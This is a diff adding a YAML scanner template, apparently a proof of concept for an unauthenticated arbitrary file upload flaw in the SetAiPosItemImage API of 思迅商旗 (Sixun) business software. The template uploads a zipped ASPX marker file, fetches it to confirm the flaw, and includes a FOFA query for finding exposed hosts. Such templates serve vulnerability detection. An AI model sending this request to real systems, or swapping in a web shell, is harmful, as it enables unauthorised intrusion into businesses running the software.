@@ -1,0 +1,20 @@
+id: poc-yaml-sixun-scms-setaipositemimage-anyfile-upload
+info:
+  name: 思迅商旗商业管理系统 SetAiPosItemImage 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 思迅商旗商业管理系统
+  fofa: body="思迅商旗"
+requests:
+- method: POST
+  path: /api/POS/SetAiPosItemImage
+  headers:
+    Content-Type: application/json
+  data: '{"Body":{"pos_id":"test","file_data":"UEsDBAoAAAAAANFuTFoLuC55JAAAACQAAAAJAAAAdGVzdC5hc3B4VGhlcmUgaXMgYSBmaWxlIHVwbG9hZCB2dWxuZXJhYmlsaXR5UEsBAj8ACgAAAAAA0W5MWgu4LnkkAAAAJAAAAAkAJAAAAAAAAAAgAAAAAAAAAHRlc3QuYXNweAoAIAAAAAAAAQAYAAwUeZYSfdsBAAAAAAAAAAAAAAAAAAAAAFBLBQYAAAAAAQABAFsAAABLAAAAAAA=","last_time":""}}'
+  expression: status_code == 200 && contains(body,"DataTransResponseDTO") && contains(body,"<Success>true</Success>")
+- method: GET
+  path: /AiItemImage/test.aspx
+  expression: status_code == 200 && body == "There is a file upload vulnerability"
+variables: {}
+transport: http
